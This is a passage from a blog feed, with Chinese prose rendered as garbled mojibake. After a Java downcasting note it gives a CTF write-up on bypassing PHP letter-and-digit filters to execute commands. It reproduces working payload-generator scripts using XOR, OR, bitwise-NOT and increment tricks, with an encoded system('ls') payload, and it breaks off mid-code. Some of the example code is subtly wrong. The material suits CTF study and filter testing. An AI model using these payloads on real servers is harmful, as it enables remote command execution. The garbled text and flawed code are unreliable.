<p>éœ€è¦å‘ä¸‹è½¬å‹çš„æ—¶å€™<br><mark>å½“è°ƒç”¨çš„æ–¹æ³•æ˜¯å­ç±»å‹ä¸­ç‰¹æœ‰çš„ï¼Œåœ¨çˆ¶ç±»å‹å½“ä¸­ä¸å­˜åœ¨ï¼Œå¿…é¡»å‘ä¸‹è½¬å‹</mark></p>
<p>ç”¨å¼ºåˆ¶è½¬æ¢ç±»å‹ï¼Œå‘ä¸‹è½¬å‹ï¼Œç¨‹åºè™½ç„¶é€šè¿‡äº†ï¼Œä½†æ˜¯ç¨‹åºåœ¨è¿è¡Œé˜¶æ®µä¼šå‡ºç°å¼‚å¸¸ï¼Œå› ä¸ºJVMå †å†…å­˜å½“ä¸­çœŸå®å­˜åœ¨çš„å¯¹è±¡æ˜¯Birdç±»å‹ï¼ŒBirdå¯¹è±¡æ— æ³•è½¬æ¢æˆCatå¯¹è±¡ï¼Œå› ä¸ºä¸¤ç§ç±»å‹ä¹‹é—´ä¸å­˜åœ¨ä»»ä½•ç»§æ‰¿å…³ç³»ï¼Œæ­¤æ—¶å‡ºç°äº†è‘—åçš„å¼‚å¸¸ï¼š</p>
<ul>
<li><pre><code>  java.lang.classcastexception
</code></pre>
</li>
<li>ç±»å‹è½¬æ¢å¼‚å¸¸ï¼Œè¿™ç§å¼‚å¸¸æ€»æ˜¯åœ¨â€å‘ä¸‹è½¬å‹â€çš„æ—¶å€™ä¼šå‘ç”Ÿ<blockquote>
<p>æ¬¡å¼‚å¸¸åªä¼šå‡ºç°åœ¨â€å‘ä¸‹è½¬å‹â€ï¼Œè¯´æ˜â€å‘ä¸‹è½¬å‹â€å­˜åœ¨éšæ‚£ï¼ˆç¼–è¯‘è¿‡äº†ï¼Œä½†æ˜¯å­˜åœ¨è¿è¡Œé”™è¯¯ï¼‰</p>
</blockquote>
</li>
</ul>
<p>1ï¼Œå‘ä¸Šè½¬å‹åªæœ‰ç¼–è¯‘è¿‡äº†ï¼Œè¿è¡Œä¸€å®šä¸ä¼šå‡ºé—®é¢˜<br>2ï¼Œå‘ä¸‹è½¬å‹ç¼–è¯‘è¿‡äº†ï¼Œè¿è¡Œå¯èƒ½å­˜åœ¨é”™è¯¯</p>
<p>é¿å…å‘ä¸‹è½¬å‹å‡ºç°çš„å¼‚å¸¸</p>
<p>ä½¿ç”¨instanceofè¿ç®—ç¬¦å¯ä»¥é¿å…æ¬¡å¼‚å¸¸</p>
<p>instanceofè¯­æ³•æ ¼å¼ï¼šå¼•ç”¨ instanceof æ•°æ®ç±»å‹å<br>ä»¥ä¸Šè¿ç®—ç¬¦çš„æ‰§è¡Œç»“æœæ˜¯å¸ƒå°”ç±»å‹ï¼Œç»“æœå¯èƒ½æ˜¯true&#x2F;false</p>
<p>å…³äºè¿ç®—ç»“æœtrue&#x2F;false<br>å‡è®¾ï¼šï¼ˆa instanceof Animalï¼‰<br>trueè¡¨ç¤º<br>aè¿™ä¸ªå¼•ç”¨æŒ‡å‘çš„ä¸€ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªAnimalç±»å‹<br>falseè¡¨ç¤º<br>aè¿™ä¸ªå¼•ç”¨æŒ‡å‘çš„ä¸€ä¸ªå¯¹è±¡ä¸æ˜¯ä¸€ä¸ªAnimalç±»å‹</p>
<p>åœ¨ä½¿ç”¨å¼ºåˆ¶ç±»å‹è½¬æ¢ç¬¦ä¹‹å‰ï¼Œä½¿ç”¨instanceofè¿ç®—ç¬¦è¿›è¡Œåˆ¤æ–­ï¼Œé¿å…classcastexceptionå¼‚å¸¸å‘ç”Ÿ</p>
]]></content>
      <categories>
        <category>è¯­è¨€å­¦ä¹ æ€»ç»“</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPæ— å­—æ¯æ— æ•°å­—å‘½ä»¤æ‰§è¡Œ</title>
    <url>/RCE/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%97%A0%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ ¹æ®CTFShowçš„å‘½ä»¤æ‰§è¡Œ41å…³çš„å•ç‹¬è§£æï¼ŒåŠå…¶æ‹“å±•</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown91020240_p0.jpg"></p>
<span id="more"></span>

<p>å‡è®¾ä¸€ä¸ªæƒ…å†µï¼Œå¯¹æäº¤çš„cmdå‚æ•°è¿›è¡Œäº†æ­£åˆ™ï¼Œä¸èƒ½æœ‰æ•°å­—å’Œå­—æ¯ï¼Œè¿™ç§æƒ…å†µå°±ç”¨åˆ°äº†å¼‚æˆ–ï¼Œé‚£ä»€ä¹ˆæ˜¯å¼‚æˆ–å‘¢ï¼Ÿ</p>
<h1 id="å¼‚æˆ–"><a href="#å¼‚æˆ–" class="headerlink" title="å¼‚æˆ–"></a>å¼‚æˆ–</h1><p>å¼‚æˆ–ï¼šå¦‚æœaã€bä¸¤ä¸ªå€¼ä¸ç›¸åŒï¼Œåˆ™å¼‚æˆ–ç»“æœä¸ºä¸€ï¼Œå¦‚æœaã€bä¸¤ä¸ªå€¼ç›¸åŒï¼Œåˆ™å¼‚æˆ–ç»“æœä¸º0ã€‚</p>
<p>å¼‚æˆ–é€Ÿè®°å£è¯€ï¼šç›¸åŒä¸º0ï¼Œä¸åŒä¸º1ã€‚</p>
<p>è¿™é‡Œçš„å€¼æ˜¯æŒ‡äºŒè¿›åˆ¶çš„å€¼ã€‚</p>
<p>PHPå®ç°å¼‚æˆ–è¿ç®—ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> a^b;</span><br></pre></td></tr></table></figure>


<p>æ¸¸è§ˆå™¨ä¸­æ‰§è¡Œå¦‚ä¸Šä»£ç ï¼Œæ¸¸è§ˆå™¨ä¼šæ‰“å°ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æŠ¥é”™ã€‚</p>
<p>ä¿®æ”¹ä»£ç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">ord</span>(a^b);</span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°ä¸€ä¸ª3ã€‚</p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¼šå¾—åˆ°ä¸€ä¸ª3å‘¢ï¼Œaå’Œbçš„Asciiç çš„äºŒè¿›åˆ¶å€¼ï¼Œåˆ†åˆ«ä¸º<code>0110 0001</code>å’Œ<code>0110 0010</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329091840.png"></p>
<p>å¾—åˆ°äºŒè¿›åˆ¶çš„<code>0000 0011</code> ï¼Œåˆšå¥½æ˜¯3ï¼Œè¿™å°±æ˜¯è§£é‡Šäº†æ¸¸è§ˆå™¨ä¸­çš„3æ˜¯æ€ä¹ˆæ¥çš„ã€‚</p>
<p>åˆ°æ­¤ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥åˆ©ç”¨å¼‚æˆ–æ„å»ºä¸€ä¸ªå‘½ä»¤æ‰§è¡Œè„šæœ¬ï¼Œå› ä¸ºæ­£åˆ™äº†æ•°å­—å’Œå­—æ¯ï¼Œæ‰€ä»¥å…ˆæ’é™¤ä¸å¯ç”¨ç”¨çš„Asciiç ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ascii 33-47 58-64 91-96 123-126</span><br></pre></td></tr></table></figure>




<p>33-47åŒ…å«çš„Asciiç æ˜¯0011 1010 - 0100-0000</p>
<p>è€Œaçš„Asciiå€¼ä¸º0110 0001ç”±äº33-47çš„ç¬¬äºŒä½æ°¸è¿œä¸º0ï¼Œç›¸åŒå¼‚æˆ–åä¸º0ï¼Œä¸æ»¡è¶³æ¡ä»¶passæ‰ã€‚</p>
<p>58-64åŒ…å«çš„Asciiç æ˜¯0010 1010 - 0100 0000</p>
<p>å°±å–æœ€åä¸€ä¸ª0100 0000æ¥æµ‹è¯•æ„é€ a</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220329092011.png"></p>
<p>æ‰€ä»¥å¯å¾—</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä½¿ç”¨è¾¹æ¥æ¥æ„é€ å‡ºå…¶ä»–å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>);</span><br><span class="line"><span class="variable">$__</span>=++<span class="variable">$_</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$__</span>;</span><br></pre></td></tr></table></figure>


<p>è¿™é‡Œå¯ä»¥é¡ºåˆ©æ‰“å°å‡ºbï¼Œ<code>ï¼ˆé€šè¿‡è‡ªå¢ï¼‰</code></p>
<p>ç»¼ä¸Šå¯å¾—ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); <span class="comment">//a</span></span><br><span class="line"><span class="variable">$___</span>=++<span class="variable">$__</span>; <span class="comment">//b</span></span><br><span class="line"><span class="variable">$____</span>=++<span class="variable">$___</span>; <span class="comment">//c</span></span><br><span class="line"><span class="variable">$_____</span>=++<span class="variable">$____</span>; <span class="comment">//d</span></span><br><span class="line"><span class="variable">$______</span>=++<span class="variable">$_____</span>; <span class="comment">//e</span></span><br><span class="line"><span class="variable">$_______</span>=++<span class="variable">$______</span>; <span class="comment">//f</span></span><br><span class="line"><span class="variable">$________</span>=++<span class="variable">$_______</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$_________</span>=++<span class="variable">$________</span>; <span class="comment">//h</span></span><br><span class="line"><span class="variable">$__________</span>=++<span class="variable">$_________</span>; <span class="comment">//i</span></span><br><span class="line"><span class="variable">$___________</span>=++<span class="variable">$__________</span>; <span class="comment">//g</span></span><br><span class="line"><span class="variable">$____________</span>=++<span class="variable">$___________</span>; <span class="comment">//k</span></span><br><span class="line"><span class="variable">$_____________</span>=++<span class="variable">$____________</span>; <span class="comment">//l</span></span><br><span class="line"><span class="variable">$______________</span>=++<span class="variable">$_____________</span>; <span class="comment">//m</span></span><br><span class="line"><span class="variable">$_______________</span>=++<span class="variable">$______________</span>; <span class="comment">//n</span></span><br><span class="line"><span class="variable">$________________</span>=++<span class="variable">$_______________</span>; <span class="comment">//o</span></span><br><span class="line"><span class="variable">$_________________</span>=++<span class="variable">$________________</span>; <span class="comment">//p</span></span><br><span class="line"><span class="variable">$__________________</span>=++<span class="variable">$_________________</span>; <span class="comment">//q</span></span><br><span class="line"><span class="variable">$___________________</span>=++<span class="variable">$__________________</span>; <span class="comment">//r</span></span><br><span class="line"><span class="variable">$____________________</span>=++<span class="variable">$___________________</span>; <span class="comment">//s</span></span><br><span class="line"><span class="variable">$_____________________</span>=++<span class="variable">$____________________</span>; <span class="comment">//t</span></span><br><span class="line"><span class="variable">$______________________</span>=++<span class="variable">$_____________________</span>; <span class="comment">//u</span></span><br><span class="line"><span class="variable">$_______________________</span>=++<span class="variable">$______________________</span>; <span class="comment">//v</span></span><br><span class="line"><span class="variable">$________________________</span>=++<span class="variable">$_______________________</span>; <span class="comment">//w</span></span><br><span class="line"><span class="variable">$_________________________</span>=++<span class="variable">$________________________</span>; <span class="comment">//x</span></span><br><span class="line"><span class="variable">$__________________________</span>=++<span class="variable">$_________________________</span>; <span class="comment">//y</span></span><br><span class="line"><span class="variable">$___________________________</span>=++<span class="variable">$__________________________</span>; <span class="comment">//z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç”Ÿæˆä¸€ä¸ªphpinfo()è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="variable">$_________________</span>.<span class="variable">$_________</span>.<span class="variable">$_________________</span>.<span class="variable">$__________</span>.<span class="variable">$_______________</span>.<span class="variable">$_______</span>.<span class="variable">$________________</span>)();</span><br></pre></td></tr></table></figure>


<p>æ‰§è¡Œå³å¯å¾—åˆ°</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20220331113835.png"></p>
<p>ç„¶åæ„é€ å‡ºsystemå­—ç¬¦ä¸²æ‹¿flagã€‚</p>
<h1 id="å¼‚æˆ–â†’EXP"><a href="#å¼‚æˆ–â†’EXP" class="headerlink" title="å¼‚æˆ–â†’EXP"></a>å¼‚æˆ–â†’EXP</h1><p>ä¸ºäº†åº”å¯¹å¤šç§æƒ…å†µï¼Œæ”¾ä¸ªç¾½å¸ˆå‚…çš„è„šæœ¬ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*author yu22x*/</span><br><span class="line"></span><br><span class="line">$myfile = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">$contents=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123; </span><br><span class="line">  <span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;<span class="number">256</span> ; $j++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($i&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_i=<span class="string">&#x27;0&#x27;</span>.dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_i=dechex($i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($j&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      $hex_j=<span class="string">&#x27;0&#x27;</span>.dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      $hex_j=dechex($j);</span><br><span class="line">    &#125;</span><br><span class="line">    $preg = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; //æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br><span class="line">    <span class="keyword">if</span>(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">          echo <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="string">&#x27;%&#x27;</span>.$hex_i;</span><br><span class="line">    $b=<span class="string">&#x27;%&#x27;</span>.$hex_j;</span><br><span class="line">    $c=(urldecode($a)^urldecode($b));</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ord</span>($c)&gt;=<span class="number">32</span>&amp;<span class="built_in">ord</span>($c)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      $contents=$contents.$c.<span class="string">&quot; &quot;</span>.$a.<span class="string">&quot; &quot;</span>.$b.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite($myfile,$contents);</span><br><span class="line">fclose($myfile);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>phpè¿è¡Œåç”Ÿæˆä¸€ä¸ªtxtæ–‡æ¡£ï¼ŒåŒ…å«æ‰€æœ‰å¯è§å­—ç¬¦çš„å¼‚æˆ–æ„é€ ç»“æœã€‚<br>æ¥ç€è¿è¡Œpythonè„šæœ¬å³å¯ã€‚<br>è¿è¡Œç»“æœ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[+] your <span class="function"><span class="keyword">function</span>ï¼š<span class="title">system</span></span></span><br><span class="line"><span class="function">[+] <span class="title">your</span> <span class="title">command</span>ï¼š<span class="title">ls</span></span></span><br><span class="line"><span class="function">(<span class="params"><span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span></span>)(<span class="params"><span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span></span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>




<p>ç°åœ¨äº†è§£äº†å¼‚æˆ–ï¼Œç»§ç»­æ‹“å±•æ€ç»´ï¼Œæ—¢ç„¶å¼‚æˆ–å¯ä»¥ï¼Œé‚£ä¹ˆæˆ–ï¼Œå–åï¼Œè‡ªå¢ï¼Œä¸­æ–‡æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥å¾—åˆ°æˆ‘ä»¬çš„ç»“æœå‘¢ã€‚</p>
<h1 id="æˆ–â†’EXP"><a href="#æˆ–â†’EXP" class="headerlink" title="æˆ–â†’EXP"></a>æˆ–â†’EXP</h1><p>åŸç†ä¸€æ ·ï¼Œéƒ½æ˜¯é€šè¿‡16è¿›åˆ¶æ¯”å¯¹å¾—åˆ°ç‰¹å®šå­—ç¬¦ï¼Œä¸Šè„šæœ¬ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">    <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">      <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="å–åâ†’EXP"><a href="#å–åâ†’EXP" class="headerlink" title="å–åâ†’EXP"></a>å–åâ†’EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="è‡ªå¢â†’EXP"><a href="#è‡ªå¢â†’EXP" class="headerlink" title="è‡ªå¢â†’EXP"></a>è‡ªå¢â†’EXP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$precode</span> = <span class="string">&lt;&lt;&lt;code</span></span><br><span class="line"><span class="string">\$_=(&#x27;@&#x27;^&#x27;!&#x27;); //a</span></span><br><span class="line"><span class="string">\$___=++<span class="subst">$__</span>; //b</span></span><br><span class="line"><span class="string">\$____=++<span class="subst">$___</span>; //c</span></span><br><span class="line"><span class="string">\$_____=++<span class="subst">$____</span>; //d</span></span><br><span class="line"><span class="string">\$______=++<span class="subst">$_____</span>; //e</span></span><br><span class="line"><span class="string">\$_______=++<span class="subst">$______</span>; //f</span></span><br><span class="line"><span class="string">\$________=++<span class="subst">$_______</span>; //g</span></span><br><span class="line"><span class="string">\$_________=++<span class="subst">$________</span>; //h</span></span><br><span class="line"><span class="string">\$__________=++<span class="subst">$_________</span>; //i</span></span><br><span class="line"><span class="string">\$___________=++<span class="subst">$__________</span>; //g</span></span><br><span class="line"><span class="string">\$____________=++<span class="subst">$___________</span>; //k</span></span><br><span class="line"><span class="string">\$_____________=++<span class="subst">$____________</span>; //l</span></span><br><span class="line"><span class="string">\$______________=++<span class="subst">$_____________</span>; //m</span></span><br><span class="line"><span class="string">\$_______________=++<span class="subst">$______________</span>; //n</span></span><br><span class="line"><span class="string">\$________________=++<span class="subst">$_______________</span>; //o</span></span><br><span class="line"><span class="string">\$_________________=++<span class="subst">$________________</span>; //p</span></span><br><span class="line"><span class="string">\$__________________=++<span class="subst">$_________________</span>; //q</span></span><br><span class="line"><span class="string">\$___________________=++<span class="subst">$__________________</span>; //r</span></span><br><span class="line"><span class="string">\$____________________=++<span class="subst">$___________________</span>; //s</span></span><br><span class="line"><span 